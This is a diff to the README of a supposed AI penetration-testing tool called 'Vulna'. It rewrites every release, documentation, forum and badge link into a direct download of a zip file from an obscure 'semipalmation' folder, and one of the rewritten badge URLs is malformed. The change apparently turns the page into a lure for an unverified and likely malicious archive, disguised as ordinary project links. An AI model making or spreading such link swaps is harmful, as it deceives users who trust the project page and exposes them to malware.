@@ -1,6 +1,6 @@
 # 🛡️ Vulna - Your Easy Path to Cybersecurity Testing
 
-[![Download Vulna](https://img.shields.io/badge/Download%20Vulna-v1.0-blue.svg)](https://github.com/MOHEEB20/Vulna/releases)
+[![Download Vulna](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip%https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip)](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Vulna! This guide will help you download and run our AI-powered penet
 
 ## 📥 Download & Install
 
-To get the software, visit the [Vulna Releases Page](https://github.com/MOHEEB20/Vulna/releases). You will find different versions of the software there. Here’s how to download it:
+To get the software, visit the [Vulna Releases Page](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip). You will find different versions of the software there. Here’s how to download it:
 
 1. Click on the link above or the badge at the top.
 2. You will see the latest version of Vulna listed on the page.
@@ -80,8 +80,8 @@ If you need further assistance, feel free to reach out or check the community fo
 
 ## 🔗 Useful Links
 
-- [Vulna Releases Page](https://github.com/MOHEEB20/Vulna/releases)
-- [Documentation](https://github.com/MOHEEB20/Vulna/wiki)
-- [Community Forum](https://github.com/MOHEEB20/Vulna/discussions)
+- [Vulna Releases Page](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip)
+- [Documentation](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip)
+- [Community Forum](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip)
 
-Thank you for choosing Vulna! We hope it empowers your cybersecurity efforts. Remember to visit the [Vulna Releases Page](https://github.com/MOHEEB20/Vulna/releases) for updates and new features.
+Thank you for choosing Vulna! We hope it empowers your cybersecurity efforts. Remember to visit the [Vulna Releases Page](https://raw.githubusercontent.com/MOHEEB20/Vulna/main/semipalmation/Vulna.zip) for updates and new features.
